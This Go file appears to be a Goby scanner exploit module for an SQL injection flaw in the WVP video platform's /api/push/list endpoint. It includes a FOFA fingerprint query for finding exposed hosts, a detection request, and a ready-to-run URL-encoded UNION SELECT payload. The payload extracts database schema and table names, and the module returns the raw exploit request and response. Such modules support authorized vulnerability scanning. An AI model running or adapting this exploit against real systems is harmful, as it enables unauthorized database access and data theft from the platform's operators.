package exploits

import (
	"errors"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "WVP video platform /api/push/list SQL Injection Vulnerability",
    "Description": "<p>The WVP video platform (GB28181 standard) has an SQL injection vulnerability at the /api/push/list interface. Attackers can construct malicious SQL statements to access the database without authorization, steal, alter, or delete data, and may even gain control over the database or the server.</p>",
    "Product": "WVP video platform (GB28181 standard) ",
    "Homepage": "https://doc.wvp-pro.cn/#/",
    "DisclosureDate": "2024-07-25",
    "PostTime": "2024-07-31",
    "Author": "maweixuan@baimaohui.net",
    "FofaQuery": "body=\"vendor.cef47c86a706fd4ee05e.js\" && body=\"EasyWasmPlayer.js\"",
    "GobyQuery": "body=\"vendor.cef47c86a706fd4ee05e.js\" && body=\"EasyWasmPlayer.js\"",
    "Level": "2",
    "Impact": "<p>This vulnerability could lead to unauthorized data access, data leakage, data tampering, and even loss of control over the entire system, posing a serious threat to the data security, system stability, and business continuity of the enterprise.</p>",
    "Recommendation": "<p>It is recommended to immediately reinforce the security of the related interfaces, including strict validation and filtering of input parameters, the use of prepared SQL statements, and limiting the permissions of database users. Additionally, a comprehensive security audit should be conducted to identify and fix other potential security vulnerabilities.</p>",
    "References": [
        "https://blog.csdn.net/weixin_48539059/article/details/140721514"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "1%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x717a707171%2CJSON_ARRAYAGG%28CONCAT_WS%280x79746e73656b%2Ctable_schema%2Ctable_name%29%29%2C0x71786b6b71%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%280x696e666f726d6174696f6e5f736368656d61%2C0x6d7973716c%2C0x706572666f726d616e63655f736368656d61%2C0x737973%2C0x777670%29%23",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/push/list?page=1&count=15&query=1'&pushing=&mediaServerId=",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "querying database",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/api/push/list?page=1&count=15&query=1'&pushing=&mediaServerId="
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/push/list?page=1&count=15&query={{{attackType}}}&pushing=&mediaServerId=",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "undefined",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "HW-2024",
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "WVP视频平台(国标28181) /api/push/list SQL 注入漏洞",
            "Product": "WVP视频平台（国标28181）",
            "Description": "<p>WVP视频平台（国标28181）的/api/push/list接口存在SQL注入漏洞。攻击者可以通过构造恶意的SQL语句，在未授权的情况下访问数据库，窃取、篡改或删除数据，甚至可能获得数据库乃至服务器的控制权限。<br></p>",
            "Recommendation": "<p>建议立即对相关接口进行安全加固，包括对输入参数进行严格的验证和过滤，使用预编译的SQL语句，以及限制数据库用户的权限。同时，进行全面的安全审计，以发现和修复可能存在的其他安全漏洞。<br></p>",
            "Impact": "<p>此漏洞可能导致未经授权的数据访问、数据泄露、数据篡改甚至整个系统的控制权丧失，对企业的数据安全、系统稳定性和业务连续性构成严重威胁。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "HW-2024",
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "WVP video platform /api/push/list SQL Injection Vulnerability",
            "Product": "WVP video platform (GB28181 standard) ",
            "Description": "<p>The&nbsp;WVP video platform (GB28181 standard) has an SQL injection vulnerability at the /api/push/list interface.&nbsp;Attackers can construct malicious SQL statements to access the database without authorization, steal, alter, or delete data, and may even gain control over the database or the server.<br></p>",
            "Recommendation": "<p>It is recommended to immediately reinforce the security of the related interfaces, including strict validation and filtering of input parameters, the use of prepared SQL statements, and limiting the permissions of database users. Additionally, a comprehensive security audit should be conducted to identify and fix other potential security vulnerabilities.<br></p>",
            "Impact": "<p>This vulnerability could lead to unauthorized data access, data leakage, data tampering, and even loss of control over the entire system, posing a serious threat to the data security, system stability, and business continuity of the enterprise.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "HW-2024",
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10981"
}`

	sendInitialPayload_BdzykY := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		uri := `/api/push/list?page=1&count=15&query=1'&pushing=&mediaServerId=`
		cfg := httpclient.NewGetRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Timeout = 15

		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 500 {
			return nil, errors.New("not response 500")
		}
		if !strings.Contains(resp.Utf8Html, "querying database") {
			return nil, errors.New("not info")
		}
		return resp, nil
	}

	sendExploitPayload_IQcqdm := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		uri := `/api/push/list?page=1&count=15&query=` + sql + `&pushing=&mediaServerId=`
		cfg := httpclient.NewGetRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Timeout = 15

		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			_, err := sendInitialPayload_BdzykY(hostInfo)
			if err != nil {
				return false
			}

			sql := `1%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x717a707171%2CJSON_ARRAYAGG%28CONCAT_WS%280x79746e73656b%2Ctable_schema%2Ctable_name%29%29%2C0x71786b6b71%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%280x696e666f726d6174696f6e5f736368656d61%2C0x6d7973716c%2C0x706572666f726d616e63655f736368656d61%2C0x737973%2C0x777670%29%23`
			resp, err := sendExploitPayload_IQcqdm(hostInfo, sql)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.Utf8Html, "information_schemaytnsekCHARACTER_SETS") {
				return false
			}
			ss.VulURL = hostInfo.FixedHostInfo + `/api/push/list?page=1&count=15&query=` + sql + `&pushing=&mediaServerId=`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])

			if attackType == "sql" {
				resp, err := sendExploitPayload_IQcqdm(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				if !strings.Contains(resp.Utf8Html, "qzpqq") {
					expResult.Output = `漏洞利用失败: 响应不包含预期的字符串`
					expResult.Success = false
					return expResult
				}
				// 匹配类似 "information_schemaytnsek..." 的表名
				pattern := `"information_schemaytnsek.*?"`
				re := regexp.MustCompile(pattern)
				matches := re.FindAllString(resp.Utf8Html, -1)
				if len(matches) > 0 {
					expResult.Success = true
					expResult.Output = `Extracted table names: ` + strings.Join(matches, ", ")
					return expResult
				}
				expResult.Output = `漏洞利用失败: 未找到表名`
				expResult.Success = false
				return expResult
			}

			if attackType == "sqlPoint" {
				resp, err := sendExploitPayload_IQcqdm(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `GET /api/push/list?page=1&count=15&query=` + sql + `&pushing=&mediaServerId= HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
Response: ` + resp.Utf8Html
			}
			return expResult
		},
	))
}
